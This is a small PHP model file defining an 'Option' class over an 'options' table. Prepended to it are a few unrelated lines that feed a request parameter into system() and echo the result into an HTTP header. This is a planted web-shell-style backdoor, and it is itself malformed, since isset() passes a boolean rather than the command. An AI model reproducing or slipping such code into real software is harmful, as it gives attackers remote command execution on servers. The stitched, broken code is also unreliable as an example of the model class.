<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
use Hazzard\Database\Model;

class Option extends Model {
	
	protected $table = 'options';

	protected $guarded = array('id');
}